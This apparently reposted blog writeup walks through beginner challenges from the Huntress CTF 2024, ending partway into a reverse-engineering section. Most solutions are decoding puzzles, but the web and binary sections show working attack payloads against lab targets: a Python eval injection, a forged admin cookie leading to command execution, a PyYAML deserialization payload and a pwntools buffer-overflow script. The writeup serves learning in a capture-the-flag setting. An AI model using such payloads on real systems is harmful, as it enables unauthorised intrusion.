# 🎲 Huntress CTF 2024 Writeups (Warmups and other easy ones)

> **Original Source:** [Huntress CTF 2024 Writeups (Warmups and other easy ones)](https://rustybladez.medium.com/huntress-ctf-2024-writeups-warmus-and-other-easy-ones-1a303d29a6e5)
> **Platform:** rustybladez.medium.com | **Category:** `MISC` | **Year:** 2024

---

## 📝 Full Writeup

Huntress CTF 2024 Writeups (Warmups and other easy ones)[![Rusty](https://web.archive.org/web/20250825065534im_/https://miro.medium.com/v2/resize:fill:64:64/1*_Uy4apu3AGFzgOA2XWMTkQ.jpeg)

](/web/20250825065534/https://rustybladez.medium.com/?source=post_page---byline--1a303d29a6e5---------------------------------------)

[Rusty](/web/20250825065534/https://rustybladez.medium.com/?source=post_page---byline--1a303d29a6e5---------------------------------------)

·
Nov 1, 2024

[

](https://web.archive.org/web/20250825065534/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F1a303d29a6e5&operation=register&redirect=https%3A%2F%2Frustybladez.medium.com%2Fhuntress-ctf-2024-writeups-warmus-and-other-easy-ones-1a303d29a6e5&user=Rusty&userId=4ef3f2c82d8&source=---header_actions--1a303d29a6e5---------------------clap_footer------------------)

--



Hey hackers. This is my first time doing a writeup. So I’m kinda excited about it. I’m more of a writer than a hacker. So you may not find the solutions here to be like other writeups.

I’m only sharing the solutions I got myself and will add the ones I couldn’t solve in the upcoming days. For those I couldn’t solve in time, I’ll link others’ writeups that helped me solve it.

Anyway, let’s dive into this white rabbit hole.
Warmups
## The Void
> 
When you gaze long into the void, the void gazes also into you…

Author: @JohnHammond#6971

You need to connect to the remote server via netcat. The moment you do so, your terminal starts becoming fully black with random invisible characters.

I used Ctrl+C to stop the process midway. Then I copied everything between the two terminal prompts. Pasting the clipboard to a notepad will reveal the flag and many redundant characters. I guess the text was made in a way to look invisible in the terminal.

Flag: flag{b1370ac4fadd8c0237f8771d7d77286a}

## Finder’s Fee
> 
You gotta make sure the people who find stuff for you are rewarded well!

**Escalate your privileges and uncover the **`**flag.txt**`** in the **`**finder**`** user's home directory.**

Author: @JohnHammond

I’ve never done any PrivEsc challenges before. So this was new to me. Little did I know that the description of the challenge was so misleading.

I’ve wasted so much time on this challenge doing everything possible in my little capability to become **finder **and reveal the flag. However, the biggest clue for the challenge was the name.

All you had to do was use the `find` command 🤦

I already used the `find` command a few times but that was only to look for SUID binaries. Silly me. When I finally understood the secret behind the challenge’s name, I went to learn about the command details and stumbled upon [Red Hat’s documentation](https://web.archive.org/web/20250825065534/https://www.redhat.com/sysadmin/linux-find-command).

In the 4th example, there’s a way to find content. I tweaked the command to this:

```
find / -name “*txt” -exec grep -Hi flag{ {} \;
```

And ran it to reveal the flag.

Flag: flag{5da1de289823cfc200adf91d6536d914}

## Zulu
> 
Did you know that zulu is part of the phonetic alphabet?

Author: [@JohnHammond](https://web.archive.org/web/20250825065534/http://twitter.com/JohnHammond)

You’re given a file named `zulu`. Running the `file` command on it returns this:

```
zulu: compress'd data 16 bits
```

Running the `cat` command returns some gibberish. There are 2 ways to solve this challenge. You can read the file content using the `zcat `command:

```
zcat zulu
```

This immediately gives the flag. There’s another way. The above message about 16 bits implies that it’s a file compressed using the `compress` utility. This format is from an older Unix compression tool, commonly referred to as `compress`** **or `LZW` (Lempel-Ziv-Welch). The `.Z` extension is usually associated with this kind of compressed file.

So you can rename the file to `zulu.z` and run this command to uncompress it:

```
uncompress zulu.z
```

Then using `cat`, you can read the file content to reveal the flag.

Flag: flag{74235a9216ee609538022e6689b4de5c}

## Mystery
> 
Someone sent this to me…
*such enigma, such mystery:*

rkenr wozec gtrfl obbur bfgma fkgyq ctkvq zeucz hlvwx yyzat zbvns kgyyd sthmi vsifc ovexl zzdqv slyir nwqoj igxuu kdqgr fdbbd njppc mujyy wwcoy

**Settings as below:**

3 Rotor Model

Rotor 1: VI, Initial: A, Ring A

Rotor 2: I, Initial: Q, Ring A

Rotor 3: III, Initial L, Ring A

Reflector: UKW B

Plugboard: `BQ CR DI EJ KW MT OS PX UZ GH`

Author: Michael

Initially, it looks darn easy. But believe me, this one took quite a lot of brain cells out of me.

Anyways, a quick search will reveal that this is an enigma machine cipher. So I started looking for a decoder and [Cryptii](https://web.archive.org/web/20250825065534/https://cryptii.com/pipes/enigma-machine) has it. Cool. Should give me the flag right away, right? Right?…Right?

WRONG!

Deciphering the message gives this output:

```
messa gewra ppedi nligh thidd endee perou tofsi ghtlo cking itmor etigh tanyw ayyou rflag isher eflag fdfea bcacb ebfba daefb eccaa dddba fezzz
```

Hmm. So a new kind of cipher? Or is it? Well, I was smart enough to feed the cipher to ChatGPT, and guess what? He revealed the whole truth to me.

The output I received wasn’t a cipher. Oh no, my friend. It was the plaintext itself. Shadowed under the evil clouds of…whitespaces?

So yeah. If you closely look at the output, it’s English text, divided using whitespace after every 5 characters. Fixing it gives you this:

```
message wrapped in light hidden deeper out of sight locking it more tight anyway your flag is here flag fdfea bcacb ebfba daefb eccaa dddba fezzz
```

For me personally, there was one more hurdle. How do I format the flag? Spaces or no spaces? Underscores or no underscores? Tried all the combinations only to see all were incorrect. Finally, I realized that the flag is supposed to be 32 characters (inside the curly braces). The last zzz will get cut off.

Flag: flag{fdfeabcacbebfbadaefbeccaadddbafe}

Kudos to ChatGPT because without his analysis, I wouldn’t have noticed the output so easily.

## Typo
> 
Gosh darnit, I keep entering a typo in my Linux command prompt!

Author: [@JohnHammond](https://web.archive.org/web/20250825065534/http://twitter.com/JohnHammond)

In this challenge, you need to start a server and connect to it via ssh. The moment you do so, you can see a train animation in the terminal. And then the connection is disrupted. The train animation is the result of the `sl` command (that’s what the typo was referring to in the description).

So, I can assume that something is causing to automatically run the sl command whenever someone connects to the server. If we can stop that, then we can stay connected to the server. For that, I modified the `ssh` command and ran this:

```
ssh -p 32045 user@challenge.ctf.games -t “bash — noprofile — norc”
```

This command will bypass the login and interactive shell configuration files (`.bashrc`, `.bash_profile`, etc.), preventing `sl` from running automatically. This should give you more time to explore.

After running this, I successfully connected to the server without `sl` being run. I ran `ls` to find the flag.txt file and found the flag there.

Flag: flag{36a0354fbf59df454596660742bf09eb}

## I Can’t SSH
> 
I’ve got this private key… but why can’t I SSH?

Author: [@JohnHammond](https://web.archive.org/web/20250825065534/http://twitter.com/JohnHammond)

You’re given the private key in an `id_rsa` file. Then you start a container instance of the challenge to get the server address to connect to. However, if you try to connect right away with:

```
`ssh -p 30442 user@challenge.ctf.games -i id_rsa
```

You get the error: **Load key “id_rsa”: error in libcrypto**

Doing some research brought up this [forum discussion](https://web.archive.org/web/20250825065534/https://unix.stackexchange.com/questions/577402/ssh-error-while-logging-in-using-private-key-loaded-pubkey-invalid-format-and). Apparently, it’s a problem with the file format. I tried the first solution:

```
dos2unix id_rsa
vim — clean id_rsa
:wq
Enter
```

Then I gave the file read permission as per another comment in that forum.

```
chmod 400 id_rsa
```

Finally, I successfully connected to the server. Running `ls` in the server shows a flag.txt file which contains the flag.

Flag: flag{ee1f28722ec1ce1542aa1b486dbb1361}

## Unbelievable
> 
Don’t believe everything you see on the Internet!

Anyway, have you heard this intro soundtrack from Half-Life 3?

Author: @JohnHammond

You’re given a `Half-Life_3_OST.mp3` file. But when I try to open the file in an audio player, it fails. Looks like there’s something wrong with the file. So I inspect it using the `file` command.

```
file Half-Life_3_OST.mp3
```

Aha! It’s a PNG file. So I renamed the file and changed the file extension. Opening the PNG file reveals the flag.

Flag: flag{a85466991f0a8dc3d9837a5c32fa0c91}

## TXT Message
> 
Hmmm, have you seen some of the strange DNS records for the `ctf.games` domain? One of them sure is [od](https://web.archive.org/web/20250825065534/https://en.wikipedia.org/wiki/Od_(Unix))d...

Author: @JohnHammond

You can use any good DNS tools for this. I used the [DNS Checker](https://web.archive.org/web/20250825065534/https://dnschecker.org/all-dns-records-of-domain.php) online tool. After plugging in the domain, it gave some details about different record types.

Hmm. The TXT record looks a bit interesting. Moreover, the challenge name also suggests that the TXT record has to do something. I copied the text and did Hex to ASCII. That didn’t give the flag.

Then I realized the final clue. The link in the word “odd”. It leads to a Wikipedia article about **od**. This line stood out to me:

> 
The name is an acronym for “octal dump” since it defaults to printing in the **octal** data format

So I did an Octal to ASCII and got the flag.

Flag: flag{14e072f705d45882401d141c562fdc0b}

## Whamazon
> 
Wham! Bam! Amazon is entering the hacking business! Can you buy a flag?

Press the Start button on the top-right to begin this challenge.

Author: [@JohnHammond](https://web.archive.org/web/20250825065534/http://twitter.com/JohnHammond)

After connecting to a server, you’re welcomed to a program. You have 3 options: to buy, check inventory, or close the program.

Initially, your inventory is empty. So you need to buy something in order to see it in your inventory. After pressing 2, you’re greeted with a list of items.

You’re given 50 dollars. The items are listed in ascending order in terms of cost. With 50 dollars, you can only buy Apples, Oranges, and Video Games. The flag costs 1000000000. So, you need to do something in order to increase your money.

If you try to buy the possible items, you’re asked to provide an amount.

I tried to input characters to break the program. It didn’t work. Gave large numbers. That didn’t work either. The program calculates the cost, compares it to my money, and then rejects it if the cost exceeds it. But if it’s under my current balance, then the item is added to my inventory, and the cost is deducted from my balance.

I input 0 to see what happened. Interestingly, it took my input. My remaining balance was 50 dollars and my inventory had 0 apples. That means, the program doesn’t check for 0. Now then, there’s another type of illegal number I should try.

Negative numbers.

I input a negative number to see what happens. Just like I thought, it doesn’t sanitize them. That means I can input negative numbers. And what happens if I do that? Simple. The program deducts the negative price from the balance, increasing it in the process.

It’s simple math. Say I input -5 apples. Each cost 3 dollars. That means the cost is 3x(-5)=-15. So my current balance is 50-(-15)=65.

Voila. I can get as rich as possible now. With that, I bought the flag. Or so I thought. There’s another hurdle. Ugh!

Fortunately, it was easy. I won the first round and got the flag. Checked my inventory to see the flag.

Flag: flag{18bdd83cee5690321bb14c70465d3408}

## Too Many Bits
> 
What do all these ones and zero’s mean!?! We are in the **Warmups** category after all…

01100110 01101100 01100001 01100111 01111011 01100100 00110000 00110001 00110100 00110111 00110001 00110111 00110000 00110010 01100001 00110001 00110000 00110001 00110011 00110100 01100011 01100100 01100001 01100100 00110001 01100100 01100100 01100100 01100101 00110000 00110110 00110110 00110111 00111000 01100110 00110010 01100110 01111101

Author: @JohnHammond

This one’s pretty simple. Convert the binary to ASCII.

Flag: flag{d01471702a10134cdad1ddde06678f2f}

## Technical Support
> 
Want to join the party of GIFs, memes and emoji shenanigans? Or just want to ask a question for technical support regarding any challenges in the CTF?

**This CTF uses support tickets to help handle requests. If you need assistance, please create a ticket with the **`**#ctf-open-ticket**`** channel. You do not need to direct message any CTF organizers or facilitators, they will just tell you to open a ticket. You might find a flag in the ticket channel, though!**

**Connect here:
**[**Join the Discord!**](https://web.archive.org/web/20250825065534/https://huntress.ctf.games/discord)

Author: @JohnHammond

This is a giveaway problem. Just join the Discord channel to get the flag.

Flag: flag{a98373a74abb8c5ebb8f5192e034a91c}

## Cattle
> 
I know it’s an esoteric challenge for a Capture the Flag, but could you herd these cows for me?

Author: [@JohnHammond](https://web.archive.org/web/20250825065534/http://twitter.com/JohnHammond)

You’re given a file named `cattle` that contains this text:

```
OOO MoO MoO MoO MoO MoO MoO MoO MoO MMM moO MMM MMM moO MMM MOO MOo mOo MoO moO moo mOo

MMM moO MMM MMM moO MMM MOO MOo mOo MoO moO moo mOo MMM moO MMM MMM moO MMM MOO MOo mOo

MoO moO moo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO

MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM

moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO

MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO

MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO Moo mOo OOO

moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO

MoO mOo moo moO MoO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO

MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO

moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO Moo

mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO

moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo

mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo

moO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo

MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo

mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO

MoO mOo moo moO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM

MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO

MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo

mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO MoO MoO MoO MoO

Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM

moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO

MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO

MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM

moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO

moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo

moO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO

MoO mOo moo moO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO Moo mOo

OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO

moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO

OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO

mOo moo moO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO

mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO

MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO

MMM MOO MOo moO MoO mOo moo moO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO

MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO Moo

mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO

moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM

moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO

MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo

mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO Moo mOo OOO moO OOO mOo

mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo

moO MoO mOo moo moO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo

moO MoO mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO Moo

mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO

MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO

MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO

MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo

mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO MoO Moo mOo OOO

moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO

MoO mOo moo moO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo

moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO Moo mOo OOO

moO OOO mOo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO

MMM MOO MOo moO MoO mOo moo moO MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO MMM

MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO MoO

Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM

MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo mOo MMM moO moO

MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO MMM MOO MOo moO MoO mOo moo moO

MoO MoO MoO MoO MoO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO

MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO Moo mOo

OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo

moO MoO mOo moo moO MoO MoO MoO MoO Moo mOo OOO moO OOO mOo mOo MMM moO MMM MOO MOo moO

MoO mOo moo mOo mOo MMM moO moO MMM MOO MOo moO MoO mOo moo mOo mOo mOo MMM moO moO moO

MMM MOO MOo moO MoO mOo moo moO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO MoO Moo

mOo 
```

This problem name was enough the make this a giveaway. I searched for things like “cow programming language” and found that it does exist. Used an online decoder to get the flag.

Flag: flag{6cd6392eb609c6ae4c332ef6a321d9dd}

## MatryoshkaQR
> 
Wow! This is a big QR code! I wonder what it says…?

Author: [@JohnHammond](https://web.archive.org/web/20250825065534/http://twitter.com/JohnHammond)

You’re given a `qrcode.png` file containing a QR code. Scanning the code gives this:

```
\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00'\x00\x00\x00'\x01\x00\x00\x00\x00\xa4\xd8l\x98\x00\x00\x00\xf5IDATx\x9c\x01\xea\x00\x15\xff\x01\xff\x00\x00\x00\xff\x00\x80\xa2\xd9\x1a\x02\x00\xbe\xe6T~\xfa\x04\xe4\xff\x0fh\x90\x02\x00\x1a\x7f\xdc\x00\x02\x00\xde\x01H\x00\x00\xbe\xd5\x95J\xfa\x04\xc2*\x15`\x08\x00\xff\x9d.\x9f\xfe\x04\xfd#P\xc3\x0b\x02\x97\x0e:\x07d\x04/vIg\x19\x00\xbb\xcd\xf3-\xd2\x02\xfb\xd6d\xb5\x88\x02E\xc7^\xdf\xfc\x00\x84\xfb\x13\xf3J\x02\xfd\x88a\xefD\x00\xc8t$\x90\n\x01\xc7\x01\xee1\xf7\x043Q\x17\x0cH\x01\xa5\x03\x1c6d\x02\r\xf0\xbfV$\x00\xcf\x13d3\x06\x01\xee\x08J\xf5E\x00\x9b\xee\n\xac\xfa\x01\xea|\xf2\xe86\x04\xb3\xc9\x84\xf7\xb4\x02\t\x90U%\x14\x00\xbf g\xa5\xee\x02\xfbH\xf1#4\x00\xff\xa1!;\x86\x02\x81VB\xdf\xfc\x04>\xb1s\x00\x10\x02\xe4>\xab-p\x00\xa2\xc6\xfe\xf6\xee\x04\x00\x05\xcbl5\x02\x1c\xfc\x85;\xd0\x02\xc2\xfb\xe6A\x00\x01\xff\x00\x00\x00\xff\xf9\xdb_g\xf4\x9a\xddH\x00\x00\x00\x00IEND\xaeB`\x82
```

Now, the challenge name made me think I’d get another QR code image by scanning. I really got stuck in this part for a long time. I can see that it’s a hex code for PNG files. However, I didn’t have any idea of how to turn this into a PNG file. I searched for online tools but haven’t found any.

Finally, after some back and forth, I consulted ChatGPT about it. It gave me Python code to convert the hex into binary data and then write it as a PNG image file.

```
hex_data = r"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00'\x00\x00\x00'\x01\x00\x00\x00\x00\xa4\xd8l\x98\x00\x00\x00\xf5IDATx\x9c\x01\xea\x00\x15\xff\x01\xff\x00\x00\x00\xff\x00\x80\xa2\xd9\x1a\x02\x00\xbe\xe6T~\xfa\x04\xe4\xff\x0fh\x90\x02\x00\x1a\x7f\xdc\x00\x02\x00\xde\x01H\x00\x00\xbe\xd5\x95J\xfa\x04\xc2*\x15`\x08\x00\xff\x9d.\x9f\xfe\x04\xfd#P\xc3\x0b\x02\x97\x0e:\x07d\x04/vIg\x19\x00\xbb\xcd\xf3-\xd2\x02\xfb\xd6d\xb5\x88\x02E\xc7^\xdf\xfc\x00\x84\xfb\x13\xf3J\x02\xfd\x88a\xefD\x00\xc8t$\x90\n\x01\xc7\x01\xee1\xf7\x043Q\x17\x0cH\x01\xa5\x03\x1c6d\x02\r\xf0\xbfV$\x00\xcf\x13d3\x06\x01\xee\x08J\xf5E\x00\x9b\xee\n\xac\xfa\x01\xea|\xf2\xe86\x04\xb3\xc9\x84\xf7\xb4\x02\t\x90U%\x14\x00\xbf g\xa5\xee\x02\xfbH\xf1#4\x00\xff\xa1!;\x86\x02\x81VB\xdf\xfc\x04>\xb1s\x00\x10\x02\xe4>\xab-p\x00\xa2\xc6\xfe\xf6\xee\x04\x00\x05\xcbl5\x02\x1c\xfc\x85;\xd0\x02\xc2\xfb\xe6A\x00\x01\xff\x00\x00\x00\xff\xf9\xdb_g\xf4\x9a\xddH\x00\x00\x00\x00IEND\xaeB`\x82"

# Use the 'unicode_escape' decoder to convert escape sequences properly
binary_data = hex_data.encode("utf-8").decode("unicode_escape").encode("latin1")

# Write the binary data to a PNG file
with open("output.png", "wb") as file:
 file.write(binary_data)

print("PNG file created successfully.")
```

The new PNG file was another QR code, as expected. Scanning the code gave the flag.

Flag: flag{01c6e24c48f48856ee3adcca00f86e9b}

## Read The Rules
> 
Please follow the rules for this CTF!

**Connect here:**
[Read The Rules](https://web.archive.org/web/20250825065534/https://huntress.ctf.games/rules)

Author: @JohnHammond

Yet another giveaway problem. You need to find the flag on the program's Rules page. Visit the page and view the page source. You’ll find the flag commented out in the HTML section.

Flag: flag{90bc54705794a62015369fd8e86e557b}
Web
I usually don’t do web challenges because I kinda suck at them. But the challenges in the Huntress CTF were all bangers. I had some great fun solving them.

## PillowFight
> 
PillowFight uses ***advanced AI/MLRegressionLearning* ***to combine two images of your choosing

*note to investors this is not techically true at the moment we’re using a python library but please give us money and we’ll deliver it we promise.

Author: @HuskyHacks

Basically, you upload two images, and the system combines them by imposing one over the other and gives back a grayscale image. I started by uploading non-image files but that resulted in 500 internal server error.

Then I noticed that you’re given an API documentation link to Swagger. Going to the API docs, what immediately grabbed my attention was the custom `eval()` function.

Did someone just say `eval()`?

In case you didn’t know, `eval()` is an exploitable Python function. Looking closely at how the function is structured, the 3rd parameter might be exploitable.

```
convert(img1 + img2, 'L')
```

This is where I started doing some trial and error, giving different types of inputs to see what response I get. I started crafting different payloads to see if any worked. Nope. I kept getting 400 bad requests. However, I found something interesting.

The function takes empty strings and `None` as valid arguments. That made me think that I should just try to directly inject a Python function. And so I did.

```
convert(img1 + img2, open('flag.txt').read())
```

And that was a game changer. Look what I found.

I got the first 10 characters of the flag. Sweet. We’re really close. The next step is to get the whole flag. So I used slicing with my previous command to get 10 characters at a time and then combine them.

```
convert(img1 + img2, open('flag.txt').read()[0:10])
convert(img1 + img2, open('flag.txt').read()[10:20])
convert(img1 + img2, open('flag.txt').read()[20:30])
convert(img1 + img2, open('flag.txt').read()[30:40])
```

Flag: flag{b6b62e6c5cdfda3b3a8b87d90fd48d01}

## Plantopia
> 
Plantopia is our brand new, cutting edge plant care management website! Built for hobbiests and professionals alike, it’s your one stop shop for all plant care management.

Please perform a penetration test ahead of our site launch and let us know if you find anything.

Username: `testuser`
Password: `testpassword`

Author: @HuskyHacks

This was a fun web challenge. The first thing to do was log in with the given credentials. After that, you can see many pages including 3 plant profiles. But the most interesting thing was the API Docs.

After visiting that page, I saw that I needed to be admin to even try out most APIs. So, I was looking for any way to become an admin. Interestingly, the site was using a cookie system. Decoding the Base64 cookie, I saw something interesting.

```
testuser.0.1730011901
```

The cookie was following a format. First, I tried to change the username from **testuser** to **admin**, convert it to Base64, and then use it as a cookie. But that didn’t work. Then I carefully noticed the docs and found this:

The more important thing was not the username but the `isAdmin` value. I changed it to 1, forged a new cookie, and used it. Boom! I got admin privileges.

Now I could mess with all the API calls. I started messing around with all the settings and then noticed something. There was an alert command `/usr/sbin/sendmail -t` . If only I could change it to something like `cat`, I’ll be able to interact with the system.

I used the `/api/plants/{plant_id}/edit` API to tweak the alert command. It was the only one that worked. Then I `/api/admin/sendmail` API to execute it. I first tried with the ls command to see if it worked and it did.

If you come back to the dashboard, you’ll notice a logs window that wasn’t there as a normal user. Checking the logs, I noticed a flag.txt file.

Now I just changed ls to cat flag.txt and that got me the flag.

Flag: flag{c29c4d53fc432f7caeb573a9f6eae6c6}

## Y2J
> 
Everyone was so worried about Y2K, but apparently *it was a typo all along*!!

The real world-ending fears were from **Y2J**!

**Find the **`**flag.txt**`** file in the root of the filesystem.**

Author: @JohnHammond#6971

This was totally new to me. The only thing I could think of was using the text field to do something malicious (I’m just reading a file, it’s not *that* bad) so that the flag is printed in the output field.

I checked the website stack. It was made in Flask. Moving forward, I started searching for YAML to JSON conversion vulnerabilities and found something interesting.

There’s a vulnerability in PyYAML that lets you run system commands and potentially read the flag. So I started searching for payloads and found [this](https://web.archive.org/web/20250825065534/https://trevorsaudi.medium.com/yaml-2-json-hackpack-ctf-7de28ef0ecff):

```
user_input: !!python/object/apply:subprocess.check_output
 args: [ cat /tmp/flag.txt ]
 kwds: { shell: true }
```

Running this was returning an error about non-zero exit status. That’s quite possible since we’re attacking different systems. But at least we’re close. With a bit of help from ChatGPT, I modified the payload a bit.

```
user_input: !!python/object/apply:subprocess.check_output
 args: ["cat /flag.txt"]
 kwds:
 shell: true
 encoding: 'utf-8'
```

And that returned the flag.

Flag: flag{b20870a1955ac22377045e3b2dcb832a}
Binary Exploitation
## Baby Buffer Overflow — 32bit
> 
Can you command this program to where it cannot go?
To get the flag, you must somehow take control of its excecution.
Is it even possible?

Author: @aenygma

This is a classic buffer overflow problem where you need to redirect the program’s execution to a function that’s never called. This type of challenge is called ret2win (return to win(), which is a typical function name for such challenges).

You’re given a `babybufov.c` and a `babbufov` binary file. There’s a target() function that you need to redirect the program to. I won’t go into too much detail here because you can find [many resources](https://web.archive.org/web/20250825065534/https://youtu.be/E4ZWJsGySoY?si=ujx4OBT--37XCDuo) for this. What I’m going to share though are the nitty gritty detail that made this challenge a bit harder.

First of all, after downloading the binary, giving it execution permission, and trying to run it failed. Huh? This has happened before. It was throwing a “[No such file or directory](https://web.archive.org/web/20250825065534/https://www.baeldung.com/linux/no-such-file-or-directory-error)” error.

I checked the code and found that there was a command for compiling the binary. But that gave another error. Oof! Now I was missing a `bits/libc-header-start.h` or whatever file. Doing a bit of research showed me that I had to install `gcc-multilib` so I did that.

Finally, I could compile the binary and run it on my system. Now it’s time to exploit.

Again, not going into details, I successfully exploited the local binary. Time to move to the remote one. And then I faced the next hurdle. The same exploit that wrecked the local binary wasn’t working on the remote one.

What?

I was getting some sort of EOF error. After searching for literally anything on the internet (and finding many unhelpful solutions), I realized something (thanks to the Discord folks). When I recompiled the binary, the memory address of the target() function changed. I was supposed to use the memory address of the original downloaded binary.

So I downloaded the binary, grabbed the memory address, and BAM! Got the flag from the remote server. Here’s the Python script:

```
from pwn import *

# Offset and target address
offset = 28
target_address = 0x080491f5

# Craft the payload
payload = b'A' * offset + p32(target_address)
print(payload)

# If it's a local binary, use the following:
# conn = process('./babybufov')

# Connect to the remote service (if needed)
conn = remote('challenge.ctf.games', 32179) # Replace with actual host and port

# Send the payload
conn.sendline(payload)

# Interact with the shell (if successful)
conn.interactive()
```

Flag: flag{4cd3b4079393e861af489ca063373f98}
Reverse Engineering
## Stack It
> 
Our team of security analysts recently worked through a peculiar Lumma sample.
The dentists helping us advised we floss at least twice a day to help out.
He also gave us this weird file. Maybe you can help us out.

Author: @sudo_Rem

You’re given `stack_it.bin` file. Running the file command on it shows:

```
stack_it.bin: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
```

